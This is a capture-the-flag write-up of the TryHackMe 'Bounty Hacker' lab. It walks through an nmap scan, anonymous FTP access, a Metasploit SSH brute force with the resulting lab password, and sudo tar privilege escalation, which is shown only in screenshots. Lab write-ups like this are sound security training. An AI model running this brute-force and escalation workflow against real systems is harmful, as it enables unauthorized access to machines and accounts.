# BountyHacker-CTF

![image](https://github.com/user-attachments/assets/f9c392dc-5fa7-45f5-8951-a2cb9ccbe3a4)

## Overview
We are tasked to "hack" into the target system and gain root privileges to reveal the user.txt and root.txt files.

## Tools Used
- nmap for scanning
- metasploit for ssh exploitation
- GTFOBINS for binary privilege escalation
  
## Skills Learned
- ftp file transfer
- port scanning
- privilege escalation using misconfigured sudo privileges
  
## Enumeration
### Nmap Scan
1. From the nmap scan I found that ports 21(FTP), 22(SSH), and 80(HTTP) were all open on the target machine.
```
$ nmap -p 21,22,80 -A bountyhacker.thm -v -Pn


21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.13.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
```

### FTP (Port 21)
1. I will continue by enumerating the FTP server. As seen in the above scan, anonymous logins are allowed. I used the anonymous login to
  access the server.
```
$ ftp bountyhacker.thm
Connected to bountyhacker.thm.
220 (vsFTPd 3.0.3)
Name (bountyhacker.thm:username): anonymous
230 Login successful.
```

2. Then I used the ls command to list the files on the ftp server. I saw that there is a locks.txt and a tasks.txt. I uploaded a copy of
   these to my local machine with the get command. (NOTE: I only display the task.txt get below, so just repeat for locks.txt)
```
ftp> ls -l
229 Entering Extended Passive Mode (|||49509|)
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt

ftp> get task.txt
local: task.txt remote: task.txt
229 Entering Extended Passive Mode (|||22524|)
ftp: Can't connect to `10.10.250.63:22524': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**************************************************************************************************************************|    68        1.23 KiB/s    00:00 ETA
226 Transfer complete.
```

3. Now moving over to my local machine, I read the contents of these two files. I found a note from a user named lin and the following
   textfile that seems to be a list of usernames. Maybe one of these is lin's password to the system.
```
$ cat locks.txt  
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
                                                                                                                                                                       
$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

## Exploitation
1. I assume that this list contains lin's password. So I decided to use Metasploit's ssh_login module to attempt a brute force with
   this password list. I set the proper parameters to the module and ran the exploit.
```
Basic options:
  Name              Current Setting                              Required  Description
  ----              ---------------                              --------  -----------
  ANONYMOUS_LOGIN   false                                        yes       Attempt to login with a blank username and password
  BLANK_PASSWORDS   false                                        no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                                            yes       How fast to bruteforce, from 0 to 5
  CreateSession     true                                         no        Create a new session for every successful login
  DB_ALL_CREDS      false                                        no        Try each user/password couple stored in the current database
  DB_ALL_PASS       false                                        no        Add all passwords in the current database to the list
  DB_ALL_USERS      false                                        no        Add all users in the current database to the list
  DB_SKIP_EXISTING  none                                         no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm
                                                                           )
  PASSWORD                                                       no        A specific password to authenticate with
  PASS_FILE         /home/kali/tryhackme/bountyhacker/locks.txt  no        File containing passwords, one per line
  RHOSTS            bountyhacker.thm                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-met
                                                                           asploit.html
  RPORT             22                                           yes       The target port
  STOP_ON_SUCCESS   true                                         yes       Stop guessing when a credential works for a host
  THREADS           1                                            yes       The number of concurrent threads (max one per host)
  USERNAME          lin                                          no        A specific username to authenticate as
  USERPASS_FILE                                                  no        File containing users and passwords separated by space, one pair per line
  USER_AS_PASS      false                                        no        Try the username as the password for all users
  USER_FILE                                                      no        File containing usernames, one per line
  VERBOSE           true                                         yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 10.10.250.63:22 - Starting bruteforce
[-] 10.10.250.63:22 - Failed: 'lin:rEddrAGON'
[!] No active DB -- Credential data will not be saved!
[-] 10.10.250.63:22 - Failed: 'lin:ReDdr4g0nSynd!cat3'
[-] 10.10.250.63:22 - Failed: 'lin:Dr@gOn$yn9icat3'
[-] 10.10.250.63:22 - Failed: 'lin:R3DDr46ONSYndIC@Te'
[-] 10.10.250.63:22 - Failed: 'lin:ReddRA60N'
[-] 10.10.250.63:22 - Failed: 'lin:R3dDrag0nSynd1c4te'
[-] 10.10.250.63:22 - Failed: 'lin:dRa6oN5YNDiCATE'
[-] 10.10.250.63:22 - Failed: 'lin:ReDDR4g0n5ynDIc4te'
[-] 10.10.250.63:22 - Failed: 'lin:R3Dr4gOn2044'
[+] 10.10.250.63:22 - Success: 'lin:RedDr4gonSynd1cat3' 'uid=1001(lin) gid=1001(lin) groups=1001(lin) Linux bountyhacker 4.15.0-101-generic #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (10.6.13.3:38573 -> 10.10.250.63:22) at 2025-01-19 19:44:28 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
2. As seen above, the brute force was successful. Her credentials are lin:RedDr4gonSynd1cat3. I can now use these to SSH into her system
   and see how we can move further into the machine. I used the find command to search for the user.txt file and then read it with the
   cat command.
   
![image](https://github.com/user-attachments/assets/c1e575f7-49d3-4068-8e26-10de83b09fee)

## Privilege Escalation
1. The first thing I checked was the commands that lin can run with the sudo command. I saw that she has permission to use 'tar'.
   - sudo -l can be used to view the commands a user can run with sudo
     
![image](https://github.com/user-attachments/assets/c83daf18-20af-4313-b321-887e55ea7fbd)

2. I then went to https://gtfobins.github.io/gtfobins/tar/#sudo to see how I could potentially leverage the tar command to gain a root
   shell.
   
![image](https://github.com/user-attachments/assets/e5db6cf1-0d72-4e54-baf7-edea553cb1fc)

4. Using this command, I was able to successfully launch a root shell, search for root.txt, and read it as root.
   
![image](https://github.com/user-attachments/assets/7caeb4db-9b48-4962-9fda-69960f2aa5e1)
